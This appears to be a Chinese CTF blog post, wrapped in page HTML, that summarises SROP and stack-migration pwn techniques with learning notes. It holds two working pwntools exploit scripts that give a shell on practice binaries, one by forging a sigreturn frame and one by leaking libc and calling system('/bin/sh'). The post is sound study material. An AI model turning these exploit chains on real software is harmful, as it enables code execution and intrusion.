@@ -1,0 +1,760 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/pics/cat.jpg">
+  <link rel="icon" href="/pics/cat.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Luo">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="高档栈题的一点点总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Advanced Stack Summary">
+<meta property="og:url" content="http://example.com/2023/10/22/Stack/index.html">
+<meta property="og:site_name" content="Luo&#39;s B1oG">
+<meta property="og:description" content="高档栈题的一点点总结">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/pics/hatcat.jpg">
+<meta property="article:published_time" content="2023-10-22T11:47:19.000Z">
+<meta property="article:modified_time" content="2023-10-22T20:40:49.550Z">
+<meta property="article:author" content="Luo">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/pics/hatcat.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Advanced Stack Summary - Luo&#39;s B1oG</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Luo&#39;s B1oG</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/pics/hatcat.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Advanced Stack Summary"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-22 19:47" pubdate>
+          October 22, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Advanced Stack Summary</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>高档栈题的一点点总结</p>
+<span id="more"></span>
+<h2 id="0x00-O-o">0x00 O.o</h2>
+<p><s>一般的0x00是废话环节</s>…</p>
+<p>前段时间有一天突然有种水平上不去下不来的感觉, 水平说高不高说低不低, 很奇怪, 跟前辈聊了聊, wings给了个建议是做个总结, 一想, 也没什么坏处, 于是写几个高档的栈题的点, 大概是3个, 迁移, srop, ret2dlresolve.</p>
+<blockquote>
+<p>癌症晚期了, 👴8💊当白银</p>
+</blockquote>
+<p>后续应该还会加点别的, 毕竟栈题这一块还是有不少的小的东西, 例如一些好玩的fmt.</p>
+<blockquote>
+<p>23.10.23：目前下面的题应该全是newstar week3的, week3的题很不错, 一道多次迁移, 一道srop, 一道rtdlr, 缺的营养这一块给补上来了, 饱饱的, <s>也正好是我写这个东西的原因</s></p>
+</blockquote>
+<h2 id="0x01-Srop">0x01 Srop</h2>
+<blockquote>
+<p><s>个人觉得是一个比较奇怪的东西</s>😔</p>
+</blockquote>
+<h3 id="原理">原理</h3>
+<p>主要利用signal机制, linux下一个程序中断的机制, 中断时, 内核为保存程序的上下文, 将所有寄存器信息入栈.</p>
+<p><strong>中断结束后, 内核将执行sigreturn系统调用, 根据之前入栈的信息将寄存器恢复, 由于该空间可写, 故可以被伪造, 并且由于内核将sigreturn的地址放在栈顶, 故利用时只需要将伪造的frame串放置于系统调用地址后方</strong></p>
+<blockquote>
+<p>其实这个地方不是很确定, 但是实际上很多情况下都是这么利用的, 应该就是因为实际上的frame就在那个地址的后方去达到伪造的作用的.</p>
+<p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>看过最近的几个题之后我觉得似乎确实就是这样的, 至于之前的题有可能出现不是紧邻, 感觉两种情况, 1是题的情况不同要具体分析, 2是<s>我是个猪鼻没看明白</s></p>
+</blockquote>
+<p>由于功能非常强大, 故只要有syscall, 有/bin/sh串 的地址, 可以构造出一次调用, 即可随意getshell, .并且如果一次不能getshell的话, 可以随意控制sp ip寄存器, 不必担心例如迁移, 初始化等等导致的栈环境变化, 这便导致了这种方法的杀伤力非常之强.</p>
+<p>上周newstar里面的srop相对来说比较简单, 小移一次bp多构造一次read输入到可控的bss段即可.</p>
+<blockquote>
+<p><s>然后上周这个猪鼻因为frame里面系统调用号写成0x59以至于卡了半个晚上跑了, 我自己觉得是有点难绷的</s></p>
+</blockquote>
+<p>如果要多次利用, 将ip的位置指向syscall ret即可, 应该syscall函数也是可以的(我不知道我没试过), 总之pop一步ip将sp(也就是下一个构造好的sropframe地址)pop进ip即可.</p>
+<h3 id="exp">exp</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./srop&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>syscall=<span class="hljs-number">0x401040</span><br>bss=<span class="hljs-number">0x404500</span><br>leave=<span class="hljs-number">0x401171</span><br>rdiret=<span class="hljs-number">0x401203</span><br><br>srop1=SigreturnFrame()<br>srop1.rdi=<span class="hljs-number">59</span><br>srop1.rsi=bss-<span class="hljs-number">0x30</span><br>srop1.rdx=<span class="hljs-number">0</span><br>srop1.rcx=<span class="hljs-number">0</span><br>srop1.rsp=bss<br>srop1.rip=syscall<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(leave)<br>r.sendline(payload)<br><br><span class="hljs-comment">#debug()</span><br>payload=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(rdiret)+p64(<span class="hljs-number">15</span>)+p64(syscall)+<span class="hljs-built_in">bytes</span>(srop1)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+<p>感觉机制比较奇怪, 但是可能实际用起来意外的好用, <s>不是很懂你们内核的机制</s></p>
+<h2 id="0x02-Migration">0x02 Migration</h2>
+<p>这个知识点其实困扰了我个人很久, 因为迁移前后栈环境似乎会有很多微小的变化, 并且对于这种方法我始终有一种别扭的感觉在里面, 一到多次迁移就可能会在sp或者哪里出一些莫名其妙的问题.</p>
+<h3 id="原理-v2">原理</h3>
+<p>原理感觉很简单, 主要利用函数调用结束的一些规矩, rop实际在leave ret时发挥作用, 但是如果在栈空间过小以至于只够溢出不够使用时, 普遍使用重复leave ret将sp和bp拉走, 迁移到我们想要的位置, 诸如bss段/已知栈地址.</p>
+<p>这是比较好懂的, 但是实际应用过程并不是很简单的在后面加一步leave ret, 很多时候输入次数不够, 常常选择先将bp拉走, 根据缓冲区以bp寻址的特点迁移布栈, 最后布栈完成一步leave ret将ip拉来开始执行.</p>
+<p>例题有说是newstar week3的题.</p>
+<h3 id="exp-v2">exp</h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./mig&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(r)<br>    pause()<br><br>putsplt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>putsgot=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>bss=elf.bss()+<span class="hljs-number">0xa00</span><br>rdiret=<span class="hljs-number">0x4012b3</span><br>rbpret=<span class="hljs-number">0x40115d</span><br>leaveret=<span class="hljs-number">0x401227</span><br>ret=<span class="hljs-number">0x40101a</span><br>read=<span class="hljs-number">0x4011f3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+p64(bss)+p64(read)<br>r.send(payload)<br><br><span class="hljs-comment">#debug()</span><br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(putsgot)+p64(putsplt)+p64(rbpret)+p64(bss+<span class="hljs-number">0x100</span>)+p64(read)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>payload+=p64(bss-<span class="hljs-number">0x58</span>)+p64(leaveret)<br>r.send(payload)<br><br>putsaddr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>,putsaddr)<br>libcbase=putsaddr-libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sysaddr=libcbase+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binshaddr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><br>gdb.attach(r)<br>pause()<br>r.recvuntil(<span class="hljs-string">&quot;me:&quot;</span>)<br>payload=p64(rdiret)+p64(binshaddr)+p64(sysaddr)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(bss+<span class="hljs-number">0xa8</span>)+p64(leaveret)<br><br>r.send(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+<p>有个点需要注意, 在后续过程中很有可能sp会因为调用函数的时候开栈帧被拉回来, 由于0x1000页对齐, bss段其实是很大一部分, 如果偏移写少了拉回来就挂掉了, 所以迁bss的时候普遍要往更高地址迁, 诸如这个0xa00.</p>
+<blockquote>
+<p>这个题第一次迁移的时候要拉bp似乎也算是个特别的点.</p>
+</blockquote>
+<h2 id="0x03-ret2dlresolve">0x03 ret2dlresolve</h2>
+<p>没怎么看懂, 过两天再看看往这补8🔨</p>
+<blockquote>
+<p>为了这盘醋包的饺子, 但是今天有点晚了, 小🕊️一手</p>
+</blockquote>
+<h2 id="0x04-Others">0x04 Others</h2>
+<p>week3的时候, 周一晚上做第二道题能通本地不能通远程, 找了一晚上原因也不知道是为什么, 然后写srop, 写完卡在奇怪的系统调用上, <s>当时没发现是0x59的调用号</s>, 干脆跑了不做了, 然后这周搭博客+做一道vm+干了些别的事情就到今天, 倚着官方的wp从头到尾看了看自己没什么水平的栈, 突然意识到一个问题:</p>
+<p>思维有点死, 例如那个srop我甚至没能想到多次利用程序已有的read输入, 做pwn原本应该多活跃一下思维去利用应有的东西的, 但是好像做的时候并没有想到可以拿一些片段性的程序出来用, 老毛病了, 再做题先晃晃脑袋.</p>
+<blockquote>
+<p>栈迁移的先迁bp再寻址读入拉sp也是前段时间才学到的</p>
+</blockquote>
+<p>不知道是不是做的题太少了, 还是最近就没怎么做这一类的灵活栈题, 堆题也没怎么做, 那我到底干啥了（x</p>
+<p>除了学方法的同时, 感觉也要适当去哪里刷点题什么的, 最近要恢复刷各种比赛和buu, nss了.</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Pwn/Stack/" class="category-chain-item">Stack</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Advanced Stack Summary</div>
+      <div>http://example.com/2023/10/22/Stack/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Luo</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 22, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/18/CHIP-8/" title="PWNmeCTF CHIP-8 复现">
+                        <span class="hidden-mobile">PWNmeCTF CHIP-8 复现</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://cdn.staticfile.org/waline/2.15.5/waline.min.css')
+      Fluid.utils.createScript('https://cdn.staticfile.org/waline/2.15.5/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://pl-c579209fn-zangetsu486s-projects.vercel.app/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Read: 
+        <span id="busuanzi_value_site_pv"></span>
+         
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Reader: 
+        <span id="busuanzi_value_site_uv"></span>
+         
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
